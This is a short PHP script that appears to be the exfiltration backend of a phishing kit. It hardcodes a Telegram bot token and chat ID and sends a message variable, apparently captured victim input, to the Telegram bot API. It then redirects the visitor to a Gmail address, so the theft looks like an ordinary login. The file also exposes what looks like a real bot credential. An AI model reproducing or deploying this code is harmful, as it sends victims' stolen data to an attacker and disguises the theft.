<?php 
define('BOT_TOKEN', '5947301499:AAGa3PRukHt0QRfKvd90w7o4auVImo9qoW8');
define('CHAT_ID', '-920333268');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

function enviar_telegram($msj){
    $queryArray = [
      'chat_id' => CHAT_ID,
      'text' => $msj,
    ];
    $url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
    $result = file_get_contents($url);
  }
  enviar_telegram($msj);
  header("location:https://google.com/gmail/");
  ?>